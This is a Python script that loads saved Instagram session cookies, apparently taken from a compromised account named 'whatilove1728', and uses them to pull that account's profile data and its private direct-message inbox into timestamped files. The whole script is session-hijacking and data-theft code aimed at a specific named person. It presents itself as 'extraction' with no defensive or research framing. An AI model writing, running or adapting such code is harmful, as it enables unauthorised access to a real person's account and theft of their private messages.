#!/usr/bin/env python3
"""
📱 WHATILOVE1728 DATA EXTRACTION
Using existing successful session to extract profile and private data
"""

import json
import time
import requests
import os
from datetime import datetime

def load_session_data():
    """Load existing whatilove1728 session data"""
    session_files = [
        'success_whatilove1728_20250525_153211.json',
        'success_whatilove1728_20250525_153247.json',
        'success_whatilove1728_20250525_153334.json'
    ]
    
    for session_file in session_files:
        if os.path.exists(session_file):
            print(f"📂 Loading session from {session_file}")
            with open(session_file, 'r') as f:
                return json.load(f)
    return None

def extract_cookies_from_session(session_data):
    """Extract cookies for API requests"""
    cookies = {}
    if 'session_data' in session_data and 'cookies_before' in session_data['session_data']:
        for cookie in session_data['session_data']['cookies_before']:
            cookies[cookie['name']] = cookie['value']
    return cookies

def get_profile_data(username, cookies):
    """Extract profile information"""
    print(f"🎯 Extracting profile data for {username}...")
    
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android (33/13; 420dpi; 1080x2400; samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'X-IG-App-ID': '936619743392459',
        'X-ASBD-ID': '198387',
        'X-IG-WWW-Claim': '0'
    }
    
    try:
        # Try to get profile data
        profile_url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = requests.get(profile_url, headers=headers, cookies=cookies)
        
        print(f"📊 Profile request status: {response.status_code}")
        
        if response.status_code == 200:
            profile_data = response.json()
            return profile_data
        else:
            print(f"❌ Profile extraction failed with status {response.status_code}")
            print(f"Response: {response.text[:500]}")
            
    except Exception as e:
        print(f"❌ Error extracting profile: {e}")
    
    return None

def get_direct_messages(cookies):
    """Extract direct messages"""
    print("💬 Extracting direct messages...")
    
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android (33/13; 420dpi; 1080x2400; samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Requested-With': 'XMLHttpRequest',
        'X-IG-App-ID': '936619743392459',
        'X-ASBD-ID': '198387'
    }
    
    try:
        # Get DM inbox
        dm_url = "https://www.instagram.com/api/v1/direct_v2/inbox/"
        response = requests.get(dm_url, headers=headers, cookies=cookies)
        
        print(f"📊 DM request status: {response.status_code}")
        
        if response.status_code == 200:
            dm_data = response.json()
            return dm_data
        else:
            print(f"❌ DM extraction failed with status {response.status_code}")
            print(f"Response: {response.text[:500]}")
            
    except Exception as e:
        print(f"❌ Error extracting DMs: {e}")
    
    return None

def save_extraction_results(username, profile_data, dm_data):
    """Save extracted data to files"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    results = {
        "timestamp": timestamp,
        "target_account": username,
        "extraction_method": "Session Reuse",
        "profile_data": profile_data,
        "direct_messages": dm_data,
        "success": True
    }
    
    # Save comprehensive results
    filename = f"WHATILOVE1728_EXTRACTION_{timestamp}.json"
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"💾 Extraction results saved to {filename}")
    
    # Create summary
    summary_filename = f"WHATILOVE1728_SUMMARY_{timestamp}.txt"
    with open(summary_filename, 'w') as f:
        f.write(f"🎯 WHATILOVE1728 ACCOUNT EXTRACTION SUMMARY\n")
        f.write(f"{'='*50}\n\n")
        f.write(f"📅 Date: {timestamp}\n")
        f.write(f"🎯 Target: {username}\n")
        f.write(f"🔐 Method: Session Reuse\n\n")
        
        if profile_data:
            f.write("✅ Profile Data: Successfully extracted\n")
            if 'data' in profile_data and 'user' in profile_data['data']:
                user = profile_data['data']['user']
                f.write(f"👤 Full Name: {user.get('full_name', 'N/A')}\n")
                f.write(f"📝 Bio: {user.get('biography', 'N/A')}\n")
                f.write(f"👥 Followers: {user.get('edge_followed_by', {}).get('count', 'N/A')}\n")
                f.write(f"👤 Following: {user.get('edge_follow', {}).get('count', 'N/A')}\n")
                f.write(f"📸 Posts: {user.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')}\n")
        else:
            f.write("❌ Profile Data: Failed to extract\n")
        
        if dm_data:
            f.write("✅ Direct Messages: Successfully extracted\n")
            if 'inbox' in dm_data and 'threads' in dm_data['inbox']:
                thread_count = len(dm_data['inbox']['threads'])
                f.write(f"💬 Active conversations: {thread_count}\n")
        else:
            f.write("❌ Direct Messages: Failed to extract\n")
    
    print(f"📄 Summary saved to {summary_filename}")
    return filename

def main():
    print("🚀 WHATILOVE1728 DATA EXTRACTION")
    print("=" * 50)
    
    # Load existing session
    session_data = load_session_data()
    if not session_data:
        print("❌ No session data found!")
        return
    
    print("✅ Session data loaded successfully")
    
    # Extract cookies
    cookies = extract_cookies_from_session(session_data)
    print(f"🍪 Extracted {len(cookies)} cookies")
    
    username = "whatilove1728"
    
    # Extract profile data
    profile_data = get_profile_data(username, cookies)
    time.sleep(3)
    
    # Extract direct messages
    dm_data = get_direct_messages(cookies)
    time.sleep(3)
    
    # Save results
    if profile_data or dm_data:
        result_file = save_extraction_results(username, profile_data, dm_data)
        print(f"🎉 Extraction complete! Results in {result_file}")
    else:
        print("❌ No data extracted")

if __name__ == "__main__":
    main()
